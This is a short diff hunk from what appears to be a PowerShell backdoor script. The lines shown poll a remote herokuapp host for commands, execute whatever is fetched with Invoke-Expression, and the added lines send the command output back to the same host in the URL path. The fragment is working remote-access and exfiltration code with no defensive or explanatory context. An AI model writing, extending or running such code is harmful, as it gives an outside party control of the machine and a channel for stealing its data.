@@ -20,7 +20,8 @@ $s = (New-Object System.Net.WebClient).DownloadString("http://twobii.herokuapp.c
 if ($s -ne $ps) 
 {	
 if ([string]::IsNullOrEmpty($s) -eq 0) {
-IEX $s;
+$out = (processing.exe -command IEX $s);
+(New-Object System.Net.WebClient).DownloadString("http://twobii.herokuapp.com/rs/cmdreturn/" + $id + "/" + $out)
 $ps = $s;
 }
 }
